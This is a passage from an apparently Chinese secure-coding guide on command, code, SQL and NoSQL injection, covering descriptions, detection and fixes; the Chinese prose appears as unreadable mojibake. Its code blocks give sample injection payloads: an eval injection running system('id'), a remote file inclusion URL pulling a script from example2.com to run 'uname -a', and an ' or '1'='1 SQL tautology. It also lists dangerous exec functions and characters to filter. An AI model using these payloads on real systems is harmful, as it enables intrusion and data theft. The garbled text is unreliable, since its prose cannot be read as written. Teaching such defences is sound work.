â€ % @ / \ : + ,</span><br></pre></td></tr></table></figure></li><li><p>å¯¹äº<code>Linux</code>ï¼Œè½¬ä¹‰æˆ–è¿‡æ»¤ä»¥ä¸‹ç‰¹æ®Šå­—ç¬¦ï¼š</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#125; ( ) &gt; &lt; &amp; * â€˜ | = ? ; [ ] $ â€“ # ~ ! . â€ % / \ : +`,</span><br></pre></td></tr></table></figure></li></ul><p>å®¡æŸ¥ä»¥ä¸‹å‡½æ•°</p><p><strong>Java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p><strong>C/C++</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system</span><br><span class="line">exec</span><br><span class="line">ShellExecute</span><br></pre></td></tr></table></figure><p><strong>Python</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span></span><br><span class="line">eval</span><br><span class="line">os.system</span><br><span class="line">os.popen</span><br><span class="line">subprocess.popen</span><br><span class="line">subprocess.call</span><br></pre></td></tr></table></figure><p><strong>PHP</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sytem</span><br><span class="line">shell_exec</span><br><span class="line">exec</span><br><span class="line">proc_open</span><br><span class="line"><span class="keyword">eval</span></span><br></pre></td></tr></table></figure><p>â€‹    ï¼ˆ1ï¼‰å°½é‡ä¸è¦æ‰§è¡Œå¤–éƒ¨çš„åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤ï¼Œä¸¥æ ¼è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œç¦æ­¢æ‰§è¡Œéé¢„æœŸç³»ç»Ÿå‘½ä»¤ã€‚</p><p>â€‹    ï¼ˆ2ï¼‰ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°æˆ–å‡½æ•°åº“å®ç°å¤–éƒ¨åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤çš„åŠŸèƒ½ã€‚</p><p>â€‹    ï¼ˆ3ï¼‰åœ¨æ‰§è¡Œ<code>system</code>ã€<code>eval</code>ç­‰å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½çš„å‡½æ•°å‰ï¼Œç¡®å®šå‚æ•°å†…å®¹ã€‚</p><p>â€‹    ï¼ˆ4ï¼‰ä½¿ç”¨<code>escapeshellarg</code>å‡½æ•°å¤„ç†ç›¸å…³å‚æ•°ã€‚<code>Escapeshellarg</code>å‡½æ•°ä¼šå°†ä»»ä½•å¼•èµ·å‚æ•°æˆ–å‘½ä»¤ç»“æŸçš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¦‚å•å¼•å·â€œâ€™â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ<code>\â€™</code>â€ï¼ŒåŒå¼•å·â€œ<code>â€</code>â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ<code>\â€</code>â€ï¼Œåˆ†å·â€œ<code>;</code>â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ<code>\;</code>â€ï¼Œè¿™æ ·<code>escapeshellarg</code>ä¼šå°†å‚æ•°å†…å®¹é™åˆ¶åœ¨ä¸€å¯¹å•å¼•å·æˆ–åŒå¼•å·é‡Œé¢ï¼Œè½¬ä¹‰å‚æ•°ä¸­æ‰€åŒ…å«çš„å•å¼•å·æˆ–åŒå¼•å·ï¼Œä½¿å…¶æ— æ³•å¯¹å½“å‰æ‰§è¡Œè¿›è¡Œæˆªæ–­ï¼Œå®ç°é˜²èŒƒå‘½ä»¤æ³¨å…¥æ”»å‡»çš„ç›®çš„ã€‚</p><p>â€‹    ï¼ˆ5ï¼‰ä½¿ç”¨<code>safe_mode_exec_dir</code>æ‰§è¡Œå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚å°†<code>php.ini</code>æ–‡ä»¶ä¸­çš„<code>safe_mode</code>è®¾ç½®ä¸º<code>On</code>ï¼Œç„¶åå°†å…è®¸æ‰§è¡Œçš„æ–‡ä»¶æ”¾å…¥ä¸€ä¸ªç›®å½•ä¸­ï¼Œå¹¶ä½¿ç”¨<code>safe_mode_exec_dir</code>æŒ‡å®šè¿™ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚è¿™æ ·ï¼Œåœ¨éœ€è¦æ‰§è¡Œç›¸åº”çš„å¤–éƒ¨ç¨‹åºæ—¶ï¼Œç¨‹åºå¿…é¡»åœ¨<code>safe_mode_exec_dir</code>æŒ‡å®šçš„ç›®å½•ä¸­æ‰ä¼šå…è®¸æ‰§è¡Œï¼Œå¦åˆ™æ‰§è¡Œå°†å¤±è´¥ã€‚</p><h3 id="ä»£ç æ³¨å…¥"><a href="#ä»£ç æ³¨å…¥" class="headerlink" title="ä»£ç æ³¨å…¥"></a>ä»£ç æ³¨å…¥</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><p>ç”¨æˆ·é€šè¿‡æµè§ˆå™¨æäº¤æ‰§è¡Œå‘½ä»¤ï¼Œç”±äºæœåŠ¡å™¨ç«¯æ²¡æœ‰é’ˆå¯¹æ‰§è¡Œå‡½æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´åœ¨æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹å°±æ‰§è¡Œå‘½ä»¤ï¼Œå¯èƒ½ä¼šå…è®¸æ”»å‡»è€…é€šè¿‡æ”¹å˜ $PATH æˆ–ç¨‹åºæ‰§è¡Œç¯å¢ƒçš„å…¶ä»–æ–¹é¢æ¥æ‰§è¡Œä¸€ä¸ªæ¶æ„æ„é€ çš„ä»£ç ã€‚ä»£ç ä»¥ç›®æ ‡åº”ç”¨ç¨‹åºçš„è¯­è¨€æ³¨å…¥ï¼Œå¹¶ç”±è¯¥è¯­è¨€çš„æœåŠ¡å™¨ç«¯è§£é‡Šå™¨æ‰§è¡Œâ€”â€”<code>PHP</code>ï¼Œ<code>Python</code>ï¼Œ<code>Java</code>ï¼Œ<code>Perl</code>ï¼Œ<code>Ruby</code>ç­‰ã€‚</p></li><li><p>ä»£ç æ³¨å…¥ä¸å‘½ä»¤æ³¨å…¥çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œæ”»å‡»è€…ä»…å—æ³¨å…¥è¯­è¨€æœ¬èº«çš„åŠŸèƒ½çš„é™åˆ¶ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿå°†<code>PHP</code>ä»£ç æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºä¸­å¹¶æ‰§è¡Œè¯¥ä»£ç ï¼Œåˆ™å®ƒä»¬ä»…å—<code>PHP</code>èƒ½åŠ›çš„é™åˆ¶ã€‚å‘½ä»¤æ³¨å…¥åŒ…æ‹¬åˆ©ç”¨ç°æœ‰ä»£ç æ¥æ‰§è¡Œå‘½ä»¤ï¼Œé€šå¸¸æ˜¯åœ¨<code>shell</code>ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚</p></li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>é€šè¿‡æ³¨å…¥çš„ä»£ç å¯ä»¥è®¿é—®ç›´æ¥é˜»æ­¢æ”»å‡»è€…è®¿é—®çš„èµ„æºã€‚</p></li><li><p>æˆåŠŸæ‰§è¡Œä»£ç æ³¨å…¥æ”»å‡»éƒ½å¯èƒ½å¯¼è‡´æ•°æ®å®Œæ•´æ€§ä¸§å¤±ã€æœºå¯†æ€§ä¸§å¤±ï¼Œå› ä¸ºæ³¨å…¥çš„ä»£ç æ•°æ®å§‹ç»ˆä¸æ•°æ®è°ƒç”¨æˆ–å†™å…¥æœ‰å…³ã€‚æ­¤å¤–ï¼Œä»£ç æ³¨å…¥é€šå¸¸å¯ä»¥å¯¼è‡´æ‰§è¡Œä»»æ„ä»£ç ã€‚</p></li><li><p>æˆåŠŸæ‰§è¡Œä»£ç æ³¨å…¥å¯ä»¥ç»•è¿‡èº«ä»½éªŒè¯ã€‚</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šå½“å¼€å‘äººå‘˜ä½¿ç”¨<code>PHP</code> <code>eval()</code>å‡½æ•°å¹¶å‘å…¶ä¼ é€’æ”»å‡»è€…å¯ä»¥ä¿®æ”¹çš„ä¸å—ä¿¡ä»»çš„æ•°æ®æ—¶ï¼Œå¯èƒ½ä¼šæ³¨å…¥ä»£ç ã€‚</p><p>â€‹    ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤ºäº†ä½¿ç”¨<code>eval()</code>å‡½æ•°çš„å±é™©æ–¹å¼ï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$myvar = <span class="string">"varname"</span>;  $x = $_GET[<span class="string">'arg'</span>];  <span class="keyword">eval</span>(<span class="string">"\$myvar = \$x;"</span>);</span><br></pre></td></tr></table></figure></p><p>â€‹    ç”±äºæ²¡æœ‰è¾“å…¥éªŒè¯ï¼Œå› æ­¤ä¸Šé¢çš„ä»£ç å®¹æ˜“å—åˆ°ä»£ç æ³¨å…¥æ”»å‡»ã€‚</p><p>â€‹    ä¾‹å¦‚ï¼š<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?arg=1; phpinfo()</span><br></pre></td></tr></table></figure></p><p>â€‹    åœ¨åˆ©ç”¨æ­¤ç±»é”™è¯¯æ—¶ï¼Œæ”»å‡»è€…å¯èƒ½æƒ³è¦æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»£ç æ³¨å…¥é”™è¯¯ä¹Ÿå¯ä»¥ç”¨äºå‘½ä»¤æ³¨å…¥ï¼Œä¾‹å¦‚ï¼š<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?arg=1; system('id')</span><br></pre></td></tr></table></figure></p><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>æµ‹è¯•<code>PHP</code>æ³¨å…¥æ¼æ´</p></li><li><p>ä½¿ç”¨æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥æ³¨å…¥è¦å¤„ç†çš„ä»£ç ï¼ˆåœ¨æ­¤ç¤ºä¾‹ä¸­ä¸ºæ¶æ„<code>URL</code>ï¼‰ï¼Œä½œä¸ºæ‰€åŒ…å«æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼š</p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&amp;cmd=uname%20-a</span><br></pre></td></tr></table></figure><ul><li>æ¶æ„<code>URL</code>è¢«æ¥å—ä¸º<code>PHP</code>é¡µé¢çš„å‚æ•°ï¼Œè¯¥é¡µé¢ç¨åå°†ä½¿ç”¨åŒ…å«æ–‡ä»¶ä¸­çš„å€¼ã€‚</li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>éªŒè¯å’Œæ¸…é™¤è¾“å…¥ï¼šæ‰«æè½¬ä¹‰å­—ç¬¦åº”ç”¨ç¨‹åºè¯­è¨€å’Œæ“ä½œç³»ç»Ÿçš„å…¶ä»–ç‰¹æ®Šç¬¦å·ï¼Œä¾‹å¦‚æ³¨é‡Šæ ‡è®°ï¼Œè¡Œç»ˆæ­¢å­—ç¬¦å’Œå‘½ä»¤å®šç•Œç¬¦ã€‚å¦‚æœåº”ç”¨ç¨‹åºåªå¸Œæœ›ä½¿ç”¨ä¸€ç»„æœ‰é™çš„å€¼ï¼Œè¯·ä»…æ¥å—è¿™äº›å€¼ï¼Œä¾‹å¦‚é€šè¿‡å°†å…¶åˆ—å…¥ç™½åå•æˆ–æœ‰æ¡ä»¶åœ°å°†å…¶æ”¾è¡Œã€‚</p></li><li><p>é¿å…ä½¿ç”¨è„†å¼±çš„è¯„ä¼°æ„é€ ï¼šå°½å¯èƒ½é¿å…åœ¨åŸå§‹ç”¨æˆ·è¾“å…¥ä¸Šä½¿ç”¨<code>eval()</code>å’Œç­‰æ•ˆå‡½æ•°ã€‚ä½¿ç”¨ç‰¹å®šäºè¯­è¨€çš„ä¸“ç”¨åŠŸèƒ½æ¥å®‰å…¨å¤„ç†ç”¨æˆ·æä¾›çš„å‚æ•°ã€‚</p></li><li><p>å°†æ‰€æœ‰è¾“å…¥æ•°æ®è§†ä¸ºä¸å¯ä¿¡ï¼šè¯·æ³¨æ„ç”¨æˆ·å¯ä»¥ä¸ºåº”ç”¨ç¨‹åºæä¾›æˆ–å¤„ç†æ•°æ®çš„æ‰€æœ‰ä½ç½®ã€‚é™¤äº†æŸ¥è¯¢å­—ç¬¦ä¸²å’Œ<code>HTML</code>è¡¨å•ä¹‹ç±»çš„æ˜æ˜¾æ³¨å…¥å‘é‡ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ç‰¹åˆ¶æ•°æ®æ–‡ä»¶ï¼Œæ‰‹åŠ¨ä¿®æ”¹çš„<code>cookie</code>å’Œå…¶ä»–æ–¹æ³•æ³¨å…¥ä»£ç ã€‚</p></li><li><p>é™åˆ¶è§£é‡Šå™¨ï¼šå¦‚æœæ‚¨å¯ä»¥æ§åˆ¶æœåŠ¡å™¨é…ç½®ï¼Œåˆ™å¯èƒ½éœ€è¦å°†è§£é‡Šå™¨åŠŸèƒ½é™åˆ¶ä¸ºåº”ç”¨ç¨‹åºæ‰€éœ€çš„æœ€ä½é™åº¦ï¼Œä»¥é˜²æ­¢å‡çº§ä¸ºç³»ç»Ÿå‘½ä»¤æ³¨å…¥ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ<code>PHP</code>åº”ç”¨ç¨‹åºä¸ä½¿ç”¨<code>system()</code>å‡½æ•°ï¼Œåˆ™å¯ä»¥é€šè¿‡åœ¨<code>disable_functions</code>æŒ‡ä»¤ä¸­å¯¹å…¶è¿›è¡ŒæŒ‡å®šæ¥åœ¨<code>php.ini</code>æ–‡ä»¶ä¸­ç¦ç”¨è¯¥å‡½æ•°ã€‚é€šå¸¸ç¦ç”¨çš„<code>PHP</code>å‡½æ•°åŒ…æ‹¬ï¼š<code>exec()</code>ï¼Œ<code>passthru()</code>ï¼Œ<code>shell_exec()</code>ï¼Œ<code>system()</code>ï¼Œ<code>proc_open()</code>ï¼Œ<code>popen()</code>ï¼Œ<code>curl_exec()</code>ï¼Œ<code>curl_multi_exec()</code>ï¼Œ<code>parse_ini_file()</code>å’Œ<code>show_source()</code>ã€‚</p></li><li><p>æ£€æŸ¥ä»£ç ï¼šä½¿ç”¨é™æ€ä»£ç æ£€æŸ¥å·¥å…·æ‰«æä¸è¾“å…¥éªŒè¯å’Œä¸å®‰å…¨è¯„ä¼°æœ‰å…³çš„æ¼æ´ã€‚</p></li><li><p>æ‰«æåº”ç”¨ç¨‹åºï¼šä½¿ç”¨åŠ¨æ€<code>Web</code>æ¼æ´æ‰«æç¨‹åºä»¥ç¡®ä¿åº”ç”¨ç¨‹åºä¸å—å„ç§ç±»å‹çš„æ”»å‡»ï¼ˆåŒ…æ‹¬ä»£ç æ³¨å…¥ï¼‰çš„å½±å“ã€‚</p></li></ul><h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li>é€šè¿‡æŠŠ<code>SQL</code>å‘½ä»¤æ’å…¥åˆ°<code>Web</code>è¡¨å•æäº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„<code>SQL</code>å‘½ä»¤ã€‚å°†ï¼ˆæ¶æ„çš„ï¼‰<code>SQL</code>å‘½ä»¤æ³¨å…¥åˆ°åå°æ•°æ®åº“å¼•æ“æ‰§è¡Œçš„èƒ½åŠ›ï¼Œå®ƒå¯ä»¥é€šè¿‡åœ¨<code>Web</code>è¡¨å•ä¸­è¾“å…¥ï¼ˆæ¶æ„ï¼‰<code>SQL</code>è¯­å¥å¾—åˆ°ä¸€ä¸ªå­˜åœ¨å®‰å…¨æ¼æ´çš„ç½‘ç«™ä¸Šçš„æ•°æ®åº“ï¼Œè€Œä¸æ˜¯æŒ‰ç…§è®¾è®¡è€…æ„å›¾å»æ‰§è¡Œ<code>SQL</code>è¯­å¥ã€‚ å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„æ¼ã€ç ´åæ•°æ®åº“å†…å®¹å’Œç»“æ„ã€ç”šè‡³åˆ©ç”¨æ•°æ®åº“æœ¬èº«çš„æ‰©å±•åŠŸèƒ½æ§åˆ¶æœåŠ¡å™¨æ“ä½œç³»ç»Ÿã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li>æ”»å‡»è€…åˆ©ç”¨<code>SQL</code>æ³¨å…¥æ¼æ´ï¼Œå¯ä»¥è·å–æ•°æ®åº“ä¸­çš„å¤šç§ä¿¡æ¯(ä¾‹å¦‚ï¼šç®¡ç†å‘˜åå°å¯†ç )ï¼Œä»è€Œè„±å–æ•°æ®åº“ä¸­å†…å®¹(è„±åº“)ã€‚åœ¨ç‰¹åˆ«æƒ…å†µä¸‹ï¼Œè¿˜å¯ä»¥ä¿®æ”¹æ•°æ®åº“å†…å®¹æˆ–è€…æ’å…¥å†…å®¹åˆ°æ•°æ®åº“ï¼Œå¦‚æœæ•°æ®åº“æƒé™åˆ†é…å­˜åœ¨é—®é¢˜ï¼Œæˆ–è€…æ•°æ®åº“æœ¬èº«å­˜åœ¨ç¼ºé™·ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡<code>SQL</code>æ³¨å…¥æ¼æ´ç›´æ¥è·å–<code>Webshell</code>æˆ–è€…æœåŠ¡å™¨ç³»ç»Ÿæƒé™ã€‚</li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šåº”ç”¨ç¨‹åºåœ¨ä¸‹é¢å­˜åœ¨è„†å¼±æ€§çš„<code>SQL</code>è¯­å¥çš„æ„é€ ä¸­ä½¿ç”¨ä¸å¯ä¿¡æ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String  query = &quot;SELECT * FROM accounts WHERE custID=&apos;&quot; +  request.getParameter(&quot;id&quot;) + &quot;&apos;â€œ;</span><br></pre></td></tr></table></figure><p>åœºæ™¯2ï¼šåŒæ ·çš„ï¼Œæ¡†æ¶åº”ç”¨çš„ç›²ç›®ä¿¡ä»»ï¼Œä»ç„¶å¯èƒ½å¯¼è‡´æŸ¥è¯¢è¯­å¥çš„æ¼æ´ã€‚ï¼ˆä¾‹å¦‚ï¼š<code>Hibernate</code>æŸ¥è¯¢è¯­è¨€ï¼ˆ<code>HQL</code>ï¼‰ï¼‰ï¼š<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Query HQLQuery =  session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id")  + "'");</span><br></pre></td></tr></table></figure></p><p>â€‹    åœ¨è¿™ä¸¤ä¸ªæ¡ˆä¾‹ä¸­ï¼Œæ”»å‡»è€…åœ¨æµè§ˆå™¨ä¸­å°†â€œ<code>id</code>â€å‚æ•°çš„å€¼ä¿®æ”¹æˆï¼š <code>â€™</code></p><p>â€‹    <code>orâ€™1â€™=â€™1</code>ã€‚ä¾‹å¦‚ï¼š<code>http://example.com/app/accountView?id=&#39; or &#39;1&#39;=&#39;1</code>è¿™æ ·æŸ¥è¯¢è¯­å¥çš„æ„ä¹‰å°±å˜æˆäº†ä»<code>accounts</code>è¡¨ä¸­è¿”å›æ‰€æœ‰çš„è®°å½•ã€‚æ›´å±é™©çš„æ”»å‡»å¯èƒ½    å¯¼è‡´æ•°æ®è¢«ç¯¡æ”¹ç”šè‡³æ˜¯å­˜å‚¨è¿‡ç¨‹è¢«è°ƒç”¨ã€‚</p><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>æäº¤å•å¼•å·å­—ç¬¦<code>&#39;</code>å¹¶æŸ¥æ‰¾é”™è¯¯æˆ–å…¶ä»–å¼‚å¸¸ã€‚</p></li><li><p>æäº¤ä¸€äº›ç‰¹å®šäº<code>SQL</code>çš„è¯­æ³•ï¼Œä»¥è¯„ä¼°å…¥å£ç‚¹çš„åŸºç¡€ï¼ˆåŸå§‹ï¼‰å€¼å’Œå…¶ä»–å€¼ï¼Œå¹¶åœ¨æ‰€å¾—åº”ç”¨ç¨‹åºå“åº”ä¸­å¯»æ‰¾ç³»ç»Ÿå·®å¼‚ã€‚</p></li><li><p>æäº¤å¸ƒå°”æ¡ä»¶ï¼Œä¾‹å¦‚<code>OR 1=1</code>å¹¶<code>OR 1=2</code>, <code>and</code>åœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­å¯»æ‰¾å·®å¼‚ã€‚</p></li><li><p>æäº¤æ—¨åœ¨åœ¨<code>SQL</code>æŸ¥è¯¢ä¸­æ‰§è¡Œæ—¶è§¦å‘æ—¶é—´å»¶è¿Ÿçš„æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶å¯»æ‰¾å“åº”æ—¶é—´çš„å·®å¼‚ã€‚</p></li><li><p>æäº¤æ—¨åœ¨åœ¨<code>SQL</code>æŸ¥è¯¢ä¸­æ‰§è¡Œæ—¶è§¦å‘å¸¦å¤–ç½‘ç»œäº¤äº’çš„<code>OAST</code>æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶ç›‘è§†æ‰€æœ‰ç»“æœäº¤äº’ã€‚</p></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>ä»£ç å±‚æœ€ä½³é˜²å¾¡<code>SQL</code>æ³¨å…¥æ–¹æ¡ˆï¼šé‡‡ç”¨<code>sql</code>è¯­å¥é¢„ç¼–è¯‘å’Œç»‘å®šå˜é‡ï¼Œæ˜¯é˜²å¾¡<code>sql</code>æ³¨å…¥çš„æœ€ä½³æ–¹æ³•ã€‚</p><p>ï¼ˆ1ï¼‰æ‰€æœ‰çš„æŸ¥è¯¢è¯­å¥éƒ½ä½¿ç”¨æ•°æ®åº“æä¾›çš„å‚æ•°åŒ–æŸ¥è¯¢æ¥å£ï¼Œå‚æ•°åŒ–çš„è¯­å¥ä½¿ç”¨å‚æ•°è€Œä¸æ˜¯å°†ç”¨æˆ·è¾“å…¥å˜é‡åµŒå…¥åˆ°<code>SQL</code>è¯­å¥ä¸­ã€‚å½“å‰å‡ ä¹æ‰€æœ‰çš„æ•°æ®åº“ç³»ç»Ÿéƒ½æä¾›äº†å‚æ•°åŒ–<code>SQL</code>è¯­å¥æ‰§è¡Œæ¥å£ï¼Œä½¿ç”¨æ­¤æ¥å£å¯ä»¥éå¸¸æœ‰æ•ˆçš„é˜²æ­¢<code>SQL</code>æ³¨å…¥æ”»å‡»ã€‚</p><p>ï¼ˆ2ï¼‰å¯¹è¿›å…¥æ•°æ®åº“çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆ<code>â€™â€&lt;&gt;&amp;*;</code>ç­‰ï¼‰è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œæˆ–ç¼–ç è½¬æ¢ã€‚</p><p>ï¼ˆ3ï¼‰ç¡®è®¤æ¯ç§æ•°æ®çš„ç±»å‹ï¼Œæ¯”å¦‚æ•°å­—å‹çš„æ•°æ®å°±å¿…é¡»æ˜¯æ•°å­—ï¼Œæ•°æ®åº“ä¸­çš„å­˜å‚¨å­—æ®µå¿…é¡»å¯¹åº”ä¸ºintå‹ã€‚</p><p>ï¼ˆ4ï¼‰æ•°æ®é•¿åº¦åº”è¯¥ä¸¥æ ¼è§„å®šï¼Œèƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢æ¯”è¾ƒé•¿çš„<code>SQL</code>æ³¨å…¥è¯­å¥æ— æ³•æ­£ç¡®æ‰§è¡Œã€‚</p><p>ï¼ˆ5ï¼‰ç½‘ç«™æ¯ä¸ªæ•°æ®å±‚çš„ç¼–ç ç»Ÿä¸€ï¼Œå»ºè®®å…¨éƒ¨ä½¿ç”¨<code>UTF-8</code>ç¼–ç ï¼Œä¸Šä¸‹å±‚ç¼–ç ä¸ä¸€è‡´æœ‰å¯èƒ½å¯¼è‡´ä¸€äº›è¿‡æ»¤æ¨¡å‹è¢«ç»•è¿‡ã€‚</p><p>ï¼ˆ6ï¼‰ä¸¥æ ¼é™åˆ¶ç½‘ç«™ç”¨æˆ·çš„æ•°æ®åº“çš„æ“ä½œæƒé™ï¼Œç»™æ­¤ç”¨æˆ·æä¾›ä»…ä»…èƒ½å¤Ÿæ»¡è¶³å…¶å·¥ä½œçš„æƒé™ï¼Œä»è€Œæœ€å¤§é™åº¦çš„å‡å°‘æ³¨å…¥æ”»å‡»å¯¹æ•°æ®åº“çš„å±å®³ã€‚</p><p>ï¼ˆ7ï¼‰é¿å…ç½‘ç«™æ˜¾ç¤º<code>SQL</code>é”™è¯¯ä¿¡æ¯ï¼Œæ¯”å¦‚ç±»å‹é”™è¯¯ã€å­—æ®µä¸åŒ¹é…ç­‰ï¼Œé˜²æ­¢æ”»å‡»è€…åˆ©ç”¨è¿™äº›é”™è¯¯ä¿¡æ¯è¿›è¡Œä¸€äº›åˆ¤æ–­ã€‚</p></li></ul><h3 id="NoSQLæ³¨å…¥"><a href="#NoSQLæ³¨å…¥" class="headerlink" title="NoSQLæ³¨å…¥"></a>NoSQLæ³¨å…¥</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><p><code>NoSQL</code>æ•°æ®åº“è°ƒç”¨éƒ½å†™åœ¨åº”ç”¨ç¨‹åºçš„ç¼–ç¨‹è¯­è¨€ï¼Œä¸€ä¸ªè‡ªå®šä¹‰çš„<code>API</code>è°ƒç”¨ï¼Œæˆ–æ ¼å¼åŒ–æŒ‰ç…§é€šå¸¸çš„ä¹ æƒ¯ï¼ˆå¦‚<code>XML</code>ï¼Œ<code>JSON</code>ï¼Œ<code>LINQ</code>ï¼Œç­‰ï¼‰ã€‚é’ˆå¯¹è¿™äº›è§„èŒƒçš„æ¶æ„è¾“å…¥å¯èƒ½ä¸ä¼šè§¦å‘ä¸»è¦çš„åº”ç”¨ç¨‹åºè¿‡æ»¤æ£€æŸ¥ã€‚ä¾‹å¦‚ï¼Œè¿‡æ»¤æ‰å¸¸è§çš„<code>HTML</code>ç‰¹æ®Šå­—ç¬¦ï¼ˆä¾‹å¦‚ï¼‰â€œ<code>&lt; &gt; &amp; ;</code>â€ä¸ä¼šé˜»æ­¢é’ˆå¯¹<code>JSON API</code>çš„æ”»å‡»ï¼Œå…¶ä¸­ç‰¹æ®Šå­—ç¬¦åŒ…æ‹¬â€œ<code>/ { } :</code>â€ã€‚</p></li><li><p>ä¸ä¼ ç»Ÿçš„SQLæ³¨å…¥ç›¸æ¯”ï¼ŒNoSQLæ³¨å…¥æ”»å‡»å¯èƒ½åœ¨åº”ç”¨ç¨‹åºçš„ä¸åŒåŒºåŸŸä¸­æ‰§è¡Œã€‚åœ¨æ•°æ®åº“å¼•æ“å†…æ‰§è¡ŒSQLæ³¨å…¥çš„åœ°æ–¹ï¼ŒNoSQLå˜ä½“å¯ä»¥åœ¨åº”ç”¨ç¨‹åºå±‚æˆ–æ•°æ®åº“å±‚å†…æ‰§è¡Œï¼Œå…·ä½“å–å†³äºæ‰€ä½¿ç”¨çš„NoSQL APIå’Œæ•°æ®æ¨¡å‹ã€‚é€šå¸¸ï¼ŒNoSQLæ³¨å…¥æ”»å‡»å°†åœ¨æ”»å‡»å­—ç¬¦ä¸²è¢«è§£æï¼Œè¯„ä¼°æˆ–è¿æ¥åˆ°NoSQL APIè°ƒç”¨çš„åœ°æ–¹æ‰§è¡Œã€‚</p></li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><code>NoSQL</code>æ³¨å…¥æ”»å‡»å¯ä»¥åœ¨è¿‡ç¨‹è¯­è¨€ä¸­è€Œä¸æ˜¯åœ¨å£°æ˜æ€§<code>SQL</code>è¯­è¨€ä¸­æ‰§è¡Œï¼Œå› æ­¤å…¶æ½œåœ¨å½±å“è¦å¤§äºä¼ ç»Ÿ<code>SQL</code>æ³¨å…¥ã€‚</li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ“çºµä¼ 